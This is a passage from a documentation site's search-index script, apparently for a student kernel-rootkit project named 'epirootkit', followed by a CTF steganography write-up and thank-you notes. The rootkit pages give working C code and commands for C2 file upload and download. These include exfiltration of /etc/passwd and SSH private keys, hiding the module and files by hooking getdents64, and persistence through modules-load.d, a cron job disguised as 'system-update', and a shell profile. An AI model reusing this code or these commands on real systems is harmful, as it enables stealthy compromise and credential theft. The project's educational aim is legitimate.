                content: "File Transfer linkTransfer files between the C2 server and victim system using direct content transmission.\nUpload Files linkUpload files from C2 server to victim system.\nUsage link # Upload to specific path upload Client-1 ./config.txt /etc/myapp/config.txt # Upload to current directory upload Client-1 ./script.sh Implementation link static int handle_upload(const char *data) { char *filename, *file_content, *separator; struct file *file; loff_t pos = 0; // Parse filename:content format separator = strchr(data, ':'); *separator = '\\0'; filename = data; file_content = separator + 1; // Create and write file file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644); kernel_write(file, file_content, content_length, \u0026pos); filp_close(file, NULL); return send_success(\"File uploaded successfully\"); } Download Files linkDownload files from victim system to C2 server.\nUsage link # Download to specific path download Client-1 /etc/passwd ./victim_passwd # Download to current directory download Client-1 /etc/hostname Implementation link static int handle_download(const char *data) { struct file *file; loff_t file_size, pos = 0; char *file_content; // Open and read file file = filp_open(data, O_RDONLY, 0); file_size = i_size_read(file_inode(file)); file_content = vmalloc(file_size + 1); kernel_read(file, file_content, file_size, \u0026pos); filp_close(file, NULL); return send_result(file_content); } WebUI Interface linkUpload Panel link File Selection: Choose local file to upload Remote Path: Specify destination path on victim Progress: Real-time upload progress indicator Download Panel link File Browser: Navigate victim filesystem Quick Downloads: Common system files (passwd, hosts, etc.) Batch Download: Select multiple files Security Features link Path Validation: Prevents directory traversal attacks File Size Limits: 10MB maximum transfer size Permission Control: Files created with safe permissions (0644) Error Handling: Graceful failure on permission/space issues Common Examples link # System reconnaissance download Client-1 /etc/passwd download Client-1 /etc/hosts download Client-1 /proc/version # Deploy tools upload Client-1 ./linpeas.sh /tmp/enum.sh exec Client-1 chmod +x /tmp/enum.sh # Exfiltrate data download Client-1 /home/user/.ssh/id_rsa download Client-1 /var/log/auth.log "
            }
        );
    index.add(
            {
                id:  34 ,
                href: "\/docs\/05-epirootkit\/features\/hiding\/",
                title: "Stealth \u0026 Hiding",
                description: "Module hiding and file hiding capabilities",
                content: "Stealth \u0026 Hiding linkHide the rootkit module and files from system detection using kernel hooking techniques.\nModule Hiding linkHide the rootkit module from lsmod and /proc/modules by removing it from the kernel‚Äôs module list.\nImplementation link int hide_module(void) { if (stealth_state.module_hidden) return 0; stealth_state.prev_module_entry = THIS_MODULE-\u003elist.prev; list_del(\u0026THIS_MODULE-\u003elist); stealth_state.module_hidden = true; return 0; } Technical Details:\nUses list_del() to remove from kernel module list Stores previous entry pointer for restoration Thread-safe with mutex protection Reversible operation File Hiding linkHide files with specific prefixes from directory listings by hooking the getdents64 syscall.\nSyscall Hooking link stealth_state.getdents_probe = (struct kretprobe) { .kp.symbol_name = \"ksys_getdents64\", .handler = getdents64_ret_handler, .entry_handler = getdents64_entry_handler, .data_size = sizeof(struct getdents_context), .maxactive = 20 }; How It Works link Hook ksys_getdents64 - Intercept directory read syscalls Copy buffer - Move directory data to kernel space Filter entries - Remove files matching hidden prefixes Return filtered - Send modified buffer back to userspace Hidden Prefixes link static const char * const hide_prefixes[] = { \"epirootkit\", \"jules_est_bo_\", }; Usage linkWebUI Control linkAccess via Configuration panel:\nModule Hiding: Toggle rootkit visibility File Hiding: Toggle file hiding functionality Testing link # Create test files touch /tmp/epirootkit_test /tmp/normal_file # Check visibility (file hiding enabled) ls /tmp/ # Shows: normal_file (epirootkit_test hidden) # File still accessible cat /tmp/epirootkit_test # Works normally Both features are enabled by default and can be toggled dynamically via the WebUI or C2 commands.\n"
            }
        );
    index.add(
            {
                id:  35 ,
                href: "\/docs\/05-epirootkit\/features\/persistence\/",
                title: "Persistence",
                description: "Multiple boot persistence mechanisms for rootkit survival",
                content: "Persistence linkMultiple boot persistence mechanisms to ensure rootkit survival across system reboots.\nThree Mechanisms link1. modules-load.d linkFile: /etc/modules-load.d/epirootkit.conf\nContent: epirootkit\nTrigger: systemd reads config and loads module automatically on boot\n2. Cron Jobs linkFile: /etc/cron.d/system-update\nSchedule: Every 5 minutes check and load if not present\nStealth: Disguised as system update task\n3. Shell Profiles linkFile: /etc/profile.d/system-env.sh\nTrigger: Executes when root user logs in\nCheck: Loads module if not already present\nImplementation linkAutomatic Installation link int persistence_init(void) { return persistence_install(); // Install all mechanisms } Individual Mechanisms link // modules-load.d persistence int persistence_install_modules_load(void) { return write_file(\"/etc/modules-load.d/epirootkit.conf\", \"epirootkit\\n\"); } // Cron persistence (every 5 minutes) int persistence_install_cron(void) { const char *cron_content = \"*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then \" \"modprobe epirootkit 2\u003e/dev/null || \" \"insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi'\\n\"; return write_file(\"/etc/cron.d/system-update\", cron_content, 0644); } // Shell profile persistence int persistence_install_shell_profile(void) { const char *profile_content = \"#!/bin/bash\\n\" \"if [ \\\"$(id -u)\\\" -eq 0 ]; then\\n\" \" if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then\\n\" \" modprobe epirootkit 2\u003e/dev/null\\n\" \" fi\\n\" \"fi\\n\"; return write_file(\"/etc/profile.d/system-env.sh\", profile_content, 0755); } Usage linkWebUI Control linkAccess via Persistence panel:\nInstall All: Enable all three mechanisms Remove All: Disable all mechanisms Individual Control: Toggle each mechanism separately C2 Commands link # Install all persistence mechanisms persist_install Client-1 # Remove all mechanisms persist_remove Client-1 # Individual control persist_modules Client-1 # modules-load.d only persist_cron Client-1 # cron only persist_profile Client-1 # shell profile only Verification linkCheck Installation link # modules-load.d cat /etc/modules-load.d/epirootkit.conf # epirootkit # Cron job cat /etc/cron.d/system-update # */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi' # Shell profile cat /etc/profile.d/system-env.sh # #!/bin/bash # if [ \"$(id -u)\" -eq 0 ]; then # if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then # modprobe epirootkit 2\u003e/dev/null # fi # fi Test Persistence link # Remove module and reboot rmmod epirootkit reboot # Check if module reloaded lsmod | grep epirootkit # epirootkit 20480 0 All mechanisms are enabled by default and can be managed via WebUI or C2 commands.\n"
            }
        );
    index.add(
            {
                id:  36 ,
                href: "\/docs\/05-epirootkit\/features\/dns-resolution\/",
                title: "DNS Resolution",
                description: "Kernel-space domain name resolution for flexible C2 connectivity",
                content: "DNS Resolution linkThe rootkit includes a kernel-space DNS resolver that resolves domain names to IP addresses for C2 server connections.\nOverview linkThe DNS resolver:\nResolves domain names to IP addresses in kernel space Uses UDP DNS queries to 8.8.8.8 Automatically falls back to direct IP if address is already an IP Supports A record queries for IPv4 addresses Implementation linkFiles link rootkit/network/dns_resolver.c - DNS client implementation rootkit/network/dns_resolver.h - API header Key Function link int kernel_dns_resolve(const char *hostname, u32 *ip_addr); Parameters:\nhostname: Domain name to resolve ip_addr: Pointer to store resolved IP (network byte order) Returns: 0 on success, negative error code on failure\nProcess link Create UDP socket in kernel space Build DNS query packet (A record lookup) Send query to 8.8.8.8:53 Parse response and extract IPv4 address Integration linkThe socket connection code automatically detects IP vs domain:\nif (!in4_pton(config.address, -1, (u8*)\u0026server_addr.sin_addr.s_addr, -1, NULL)) { /* Not an IP - resolve domain */ ret = kernel_dns_resolve(config.address, \u0026target_ip); if (ret \u003c 0) return ret; server_addr.sin_addr.s_addr = target_ip; } Usage linkDomain name: link sudo insmod epirootkit.ko address=c2.example.com port=4444 IP address (bypasses DNS): link sudo insmod epirootkit.ko address=192.168.1.100 port=4444 Technical Details linkDNS Protocol link Protocol: UDP Server: 8.8.8.8:53 Query type: A records only Query ID: 0x1234 (static) Buffer size: 256 bytes "
            }
        );
    index.add(
            {
                id:  37 ,
                href: "\/docs\/06-bonuses\/wlkom-ctf\/",
                title: "Tux Fan Club: Chasse au Tr√©sor Pirate",
                description: "Cap'tain Ren√© Bojolais est un petit cachotier.",
                content: "Treasure Hunt ü™ô linkD√©couverte d‚Äôun myst√©rieux fichier‚Ä¶ linkNous avons d√©cid√© d‚Äôaccepter une qu√™te secondaire durant le projet Rootkit.\nEn effet, comme tout bon pirate, nous avons t√©l√©charg√© l√©galement les fichiers fournis (given files) et nous souhaitions les ignorer avec un fichier .gitignore.\nLe .gitignore ressemblait √† :\n.gitignore givenfiles/ Sauf que les fichiers n‚Äô√©taient pas ignor√©s. (Vu que L√©a ne sait pas √©crire) C‚Äôest l√† que nous d√©couvrons un myst√©rieux fichier .README :\nArborescence r√©v√©lant le fichier cach√©\nTentative de lecture du parchemin linkApr√®s avoir acc√©d√© √† ce fichier, nous d√©cidons de l‚Äôouvrir. Le d√©chiffrer √©tait une autre paire de manches‚Ä¶\nContenu du fichier myst√©rieux\nW3lc0m3 t0 thE 53cR3t p1r4t35 l4ir. Young pirate, you have find my treasure. It is yours. Navigate safely, -- Cap'tain Ren√© Bojolais Le reste du parchemin √©tait du langage cod√©. Gr√¢ce √† notre exp√©rience en programmation et en langues, nous comprenons qu‚Äôil s‚Äôagit d‚Äôune image encod√©e en base64.\nD√©chiffrer l‚Äôimage linkAvec la commande base64 -d .README \u003e image.jpg nous avons pu obtenir l‚Äôimage (il fallait √©videmment garder que la partie en base64 du README).\nImage d√©chiffr√©e\nVoici la magnifique illustration‚Ä¶ Mais nous savons que le capitaine Ren√© avait plus d‚Äôun tour dans son sac. Donc nous d√©cidions d‚Äôexaminer l‚Äôimage en d√©tail.\nChanson cach√©e linkEn utilisant le site https://georgeom.net/StegOnline/upload pour extraire les valeurs RGB de l‚Äôimage et le texte cach√©, on remarque une cha√Æne de caract√®res insolite‚Ä¶\nExtraction de donn√©es cach√©es\nI am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wavUT\nCela nous rappelle une chanson de pirates bien connue‚Ä¶\nNotre premi√®re id√©e est de chercher le remix sur Youtube afin de voir si le Capitaine Ren√© n‚Äôa pas laiss√© un petit flag en commentaire. Apparemment, il n‚Äôest pas fan d‚ÄôOSINT, dommage üòî\nNotre deuxi√®me id√©e est de d√©zipper l‚Äôimage unzip image.jpg et l√†, bingo !\nArchive: image.jpg warning [image.jpg]: 21054 extra bytes at beginning or within zipfile (attempting to process anyway) inflating: I am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wav Audacity time linkGr√¢ce √† notre exp√©rience en CTF, nous avons tout de suite l‚Äôid√©e d‚Äôexaminer le spectrogramme.\nRien d‚Äôanormal sauf sur les derni√®res secondes du fichier. Et l√†‚Ä¶ nous trouvons le flag !\nLe tr√©sor cach√© dans le spectrogramme\nIl ne nous reste qu‚Äô√† transmettre le mot de passe au capitaine et √† nous le tr√©sor‚Ä¶\nTr√©sor link Grrr des canards\nConclusion linkUne fois cette chasse au tr√©sor finie, il est temps de commencer le projet principal üëÄ\n"
            }
        );
    index.add(
            {
                id:  38 ,
                href: "\/docs\/07-remerciements\/thankyou\/",
                title: "Un dernier mot",
                description: "Merci \u003c3",
                content: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl m‚Äôa permis d‚Äôexp√©rimenter plein de sujets diff√©rents, j‚Äôai profit√© de l‚Äôexcuse de ‚Äúc‚Äôest pour le travail d‚ÄôEPITA‚Äù pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont √©crits), j‚Äôai pu mettre en pratique directement ce que j‚Äôai pu apprendre dans mon travail, notamment j‚Äôavais d√ª faire une pr√©sentation sur un rootkit (PUMAKIT) √† ma bo√Æte, et j‚Äôai pu m‚Äôen inspirer et recr√©er le rootkit en am√©liorant certaines fonctionnalit√©s (car franchement il √©tait assez mal foutu, les Chinois n‚Äôont qu‚Äô√† bien se tenir). J‚Äôai eu l‚Äôoccasion de discuter avec certains SRS pour avoir des avis sur certaines impl√©mentations. Spoiler, ils √©taient tous jaloux du fait que en premi√®re ann√©e d‚Äôalternance on fait un projet aussi cool alors qu‚Äôils se tapent de l‚ÄôActive Directory depuis 2 mois.\nJ‚Äôai m√™me eu l‚Äôid√©e de cr√©er un nouveau club de cyber en parlant √† des gens de ma promo aussi tr√®s investis par le projet (Paul, Kyllian, Matteo‚Ä¶).\nMon ma√Ætre d‚Äôalternance (ancien SRS promo 2012), √©tait tr√®s int√©ress√© par le projet lui aussi et m‚Äôa demand√© de faire une pr√©sentation compl√®te de mon impl√©mentation devant toute l‚Äôentreprise une fois que ce sera fini.\nEt bien √©videmment, ce qui est s√ªrement le plus important, j‚Äôai pu avoir un magnifique canard en plastique, que j‚Äôai tortur√© pendant ce PTN DE RUSH DE JS (oui j‚Äôai encore des s√©quelles).\nBref merci :)\nCanard-ment,\n‚Äì\nHugo Sibony\nAPPING Cyber 2027\n‚ÄúJ‚Äô√©cris ce message a 10000m d‚Äôaltitude dans un avion qui tremble plus que moi dans l‚Äôattente de ma note de JS.‚Äù\nL√©a linkBonjour,\nC‚Äôest L√©a\nCoin-Coin-ment,\n‚Äì L√©a Bonet D√©l√©gu√©e APPING Cyb 2027\n‚ÄúAu moins Hugo ne s‚Äôest pas fait arr√™t√© √† la sortie de l‚Äôavion üëÄ‚Äù\n"
            }
        );
    index.add(
            {
                id:  39 ,
                href: "\/docs\/",
                title: "Docs",
                description: "",
                content: ""
            }
        );
    search.addEventListener('input', show_results, true);

    function show_results(){
        const maxResult =  5 ;
        const minlength =  0 ;
        var searchQuery = sanitizeHTML(this.value);
        var results = index.search(searchQuery, {limit: maxResult, enrich: true});

        
        const flatResults = new Map(); 
        for (const result of results.flatMap(r => r.result)) {
        if (flatResults.has(result.doc.href)) continue;
        flatResults.set(result.doc.href, result.doc);
        }

        suggestions.innerHTML = "";
        suggestions.classList.remove('d-none');

        
        if (searchQuery.length < minlength) {
            const minCharMessage = document.createElement('div')
            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
            minCharMessage.classList.add("suggestion__no-results");
            suggestions.appendChild(minCharMessage);
            return;
        } else {
            
            if (flatResults.size === 0 && searchQuery) {
                const noResultsMessage = document.createElement('div')
                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
                noResultsMessage.classList.add("suggestion__no-results");
                suggestions.appendChild(noResultsMessage);
                return;
            }
        }

        
        for(const [href, doc] of flatResults) {
            const entry = document.createElement('div');
            suggestions.appendChild(entry);

            const a = document.createElement('a');
            a.href = href;
            entry.appendChild(a);

            const title = document.createElement('span');
            title.textContent = doc.title;
            title.classList.add("suggestion__title");
            a.appendChild(title);

            const description = document.createElement('span');
            description.textContent = doc.description;
            description.classList.add("suggestion__description");
            a.appendChild(description);

            suggestions.appendChild(entry);

            if(suggestions.childElementCount == maxResult) break;
        }
    }
    }());
</script></body></html>